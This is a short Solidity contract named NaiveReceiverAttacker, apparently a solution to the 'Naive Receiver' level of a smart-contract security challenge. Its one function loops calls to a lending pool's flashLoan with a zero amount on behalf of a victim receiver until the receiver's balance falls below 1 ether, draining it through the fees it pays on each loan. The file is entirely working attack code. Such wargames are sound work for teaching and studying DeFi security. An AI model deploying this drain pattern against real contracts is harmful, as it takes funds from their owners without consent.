// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function flashLoan(address _loan, uint256 _amount) external;
}

contract NaiveReceiverAttacker {
    using Address for address;

    function attack(IPool pool, address payable receiver) public {
        while (receiver.balance >= 1 ether) {
            pool.flashLoan(address(receiver), 0);
        }
    }
}
